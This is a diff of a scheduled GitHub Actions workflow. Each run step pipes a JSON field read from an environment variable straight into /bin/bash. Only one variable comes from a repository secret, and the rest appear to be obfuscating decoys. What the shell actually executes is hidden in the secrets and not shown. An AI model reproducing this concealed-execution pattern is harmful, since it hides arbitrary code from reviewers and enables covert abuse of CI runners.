@@ -2,30 +2,21 @@ name: pozuojiaonong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 0/6 * * *'
+    - cron: '39 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pozuojiaonong
         env:
-          zavan6003: ${{ secrets.zavan6003 }}
+          x889: ${{ secrets.x889 }}
         run: |
-          echo $zavan6003 | jq -r .xnitq16 | /bin/bash
-          echo $urlck223 | jq -r .qzzpy5678 | /bin/bash
-          echo $gv71 | jq -r .yu2862 | /bin/bash
-          echo $hzzh7412 | jq -r .dr6688 | /bin/bash
-          echo $rw43682 | jq -r .jkdhq09798 | /bin/bash
-          echo $k5550 | jq -r .g0444 | /bin/bash
-          echo $n7251 | jq -r .hr5 | /bin/bash
-          echo $alsu64164 | jq -r .h260 | /bin/bash
-          echo $ei6 | jq -r .a82222 | /bin/bash
-          echo $jr142 | jq -r .dqfc091 | /bin/bash
-          echo $fkmhi3421 | jq -r .gav625 | /bin/bash
-          echo $y0888 | jq -r .tx38 | /bin/bash
-          echo $ec03646 | jq -r .mn7651 | /bin/bash
-          echo $pvetn1073 | jq -r .mld52 | /bin/bash
-          echo $e0987 | jq -r .wrz7 | /bin/bash
+          echo $x889 | jq -r .t6 | /bin/bash
+          echo $ghil20 | jq -r .imyvj2 | /bin/bash
+          echo $nib459 | jq -r .kecwj9633 | /bin/bash
+          echo $qngz92987 | jq -r .g00 | /bin/bash
+          echo $lqgic55512 | jq -r .fvd0546 | /bin/bash
+          echo $e3750 | jq -r .jlfj00 | /bin/bash
+          echo $wfbqi00 | jq -r .nboit97288 | /bin/bash
 
